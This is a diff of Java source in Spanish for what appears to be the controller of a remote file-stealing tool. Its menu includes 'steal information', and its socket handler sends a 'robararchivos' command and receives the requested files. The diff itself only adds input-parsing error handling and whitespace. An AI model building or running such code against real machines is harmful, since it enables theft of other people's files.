@@ -53,8 +53,13 @@ public class Principal {
             System.out.println("2)Recibir archivo");
             System.out.println("3)Enviar archivo");
             System.out.println("4)Robar informacion");
-            System.out.println("0)Salir");            
-            opc=Integer.parseInt(porleer.nextLine());
+            System.out.println("0)Salir");    
+            try{
+                opc=Integer.parseInt(porleer.nextLine());
+            }catch(Exception e){
+                System.out.println("No escribió un entero.");
+            }
+            
             
             switch(opc){                
                 case 1:
@@ -159,14 +164,16 @@ public class Principal {
                         if (aux==0){
                             System.out.println("Esperando mensaje."); 
                             aux=1;
-                        }                             
+                        } 
+                            
                         String mensaje =in.readUTF();
                         String nombarch="";
                         out.writeUTF("robararchivos");
                         while(!mensaje.equals("finalizar")){                                                
                             mensaje=in.readUTF();
                             if(mensaje.equals("archinexistente")){
-                                System.out.println("El nombre del archivo que escribio no existe. Escribalo de nuevo");                                
+                                System.out.println("El nombre del archivo que escribio no existe. Escribalo de nuevo");
+                                
                             }else if(mensaje.equals("robandoarchivo")){
                                 System.out.println("Robando archivo "+nombarch);
                                 receivedData=new byte[8192];                            
@@ -192,10 +199,13 @@ public class Principal {
                             }
                             nombarch=porleer.nextLine();
                             out.writeUTF(nombarch);
-                        }                        
+                            
+                        }  
                     }catch(IOException e){
                         System.out.println("Hubo un problema.");
-                    }                          
+                    }
+                            
+                          
                     break;     
                 default:
                     System.exit(0);
